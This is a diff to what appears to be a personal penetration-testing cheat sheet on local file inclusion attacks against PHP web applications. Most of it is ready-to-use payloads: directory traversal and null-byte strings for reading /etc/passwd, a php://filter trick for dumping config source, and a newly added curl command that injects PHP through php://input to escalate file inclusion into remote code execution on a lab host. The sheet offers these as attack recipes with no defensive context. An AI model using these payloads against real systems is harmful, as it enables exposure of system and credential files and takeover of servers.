@@ -750,14 +750,21 @@ Linux file accessible to all users
 Basic file inclusion: xxx.php?language=/etc/passwd             (../) or simply (/)
 Null byte inclusion: xxx.php?language=/etc/passwd%00           (%00) or (%00jpg)
 Base64 encoded inclusion: xxx.php?language=php://filter/read=convert.base64-encoded/resource=/etc/passwd
-					      http://192.168.6.147/?page=php://filter/convert.base64-encode/resource=config
+			  http://192.168.6.147/?page=php://filter/convert.base64-encode/resource=config
 
 replace language by page,system,file,input,etc
 
 
 TO ENUMERATE USERNAMES (..search for /home/xxx :/usr/bin   where xxx is username in passwd file) 
 
+
+
 ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00
+try sending data through curl (LFI to RCE)
+curl -s --data "<?system('id');?>" 'http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00'
+
+
+
 
 http://192.168.x.x/index.php?system=../../../../../../etc/passwd%00jpg
 http://192.168.x.x/index.php?system=../../../../../../etc/passwd
